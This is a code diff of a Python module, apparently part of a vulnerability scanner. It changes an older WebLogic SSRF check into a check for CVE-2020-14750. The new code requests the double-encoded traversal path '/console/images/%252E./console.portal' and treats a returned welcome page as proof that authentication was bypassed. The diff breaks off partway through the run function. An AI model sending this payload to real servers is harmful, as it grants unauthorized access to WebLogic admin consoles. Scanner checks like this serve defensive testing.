@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 # _*_ coding:utf-8 _*_
-# CVE-2014-4210
-# updated 2019/10/23
+# CVE-2020-14750
+# updated 2022/07/17
 # by 0xn0ne
 
-import sys
 from multiprocessing.managers import SyncManager
 from typing import Any, Dict, List, Mapping, Tuple, Union
+import requests
 
 from utils import http
 
@@ -17,27 +17,31 @@ from utils import http
 # 端口存在
 # An error has occurred
 # weblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://x.x.x.x:7001 which did not have a valid SOAP content-type: text/html.
-from stars import target_type, Star
+from stars import Star, target_type
 
 
 # @universe.groups()
-class CVE_2014_4210(Star):
+class CVE_2020_14750(Star):
     info = {
-        'NAME': 'webLogic server server-side-request-forgery',
-        'CVE': 'CVE-2014-4210',
+        'NAME': '',
+        'CVE': 'CVE-2020-14750',
         'TAG': []
     }
-    type = target_type.MODULE
+    type = target_type.VULNERABILITY
 
     def light_up(self, dip, dport, force_ssl=None, *args, **kwargs) -> (bool, dict):
+        session = requests.Session()
         r, data = http(
-            'http://{}:{}/uddiexplorer/SearchPublicRegistries.jsp'.format(dip, dport), ssl=force_ssl)
-        if r and r.status_code == 200:
+            'http://{}:{}/console/images/%252E./console.portal'.format(dip, dport), ssl=force_ssl, session=session)
+        r, data = http(
+            'http://{}:{}/console/images/%252E./console.portal'.format(dip, dport), ssl=force_ssl, session=session)
+        if r and 'id="welcome"' in r.text:
             return True, {'url': r.url}
         return False, {}
 
+
 def run(queue: SyncManager.Queue, data: Dict):
-    obj = CVE_2014_4210()
+    obj = CVE_2020_14750()
     result = {
         'IP': data['IP'],
         'PORT': data['PORT'],
